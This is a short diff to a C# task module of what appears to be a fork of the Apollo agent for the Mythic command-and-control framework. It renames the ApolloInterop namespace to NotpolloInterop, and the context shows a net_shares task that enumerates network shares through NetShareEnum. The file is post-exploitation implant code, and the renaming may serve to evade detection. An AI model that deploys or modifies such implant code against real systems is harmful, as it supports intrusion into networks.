@@ -6,10 +6,10 @@
 
 #if NET_SHARES
 
-using ApolloInterop.Classes;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using NotpolloInterop.Classes;
+using NotpolloInterop.Classes.Api;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -104,7 +104,7 @@ namespace Tasks
         }
 
 
-        public net_shares(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public net_shares(IAgent agent, NotpolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
         {
             _pNetApiBufferFree = _agent.GetApi().GetLibraryFunction<NetApiBufferFree>(Library.NETUTILS, "NetApiBufferFree");
             _pNetShareEnum = _agent.GetApi().GetLibraryFunction<NetShareEnum>(Library.SRVCLI, "NetShareEnum");
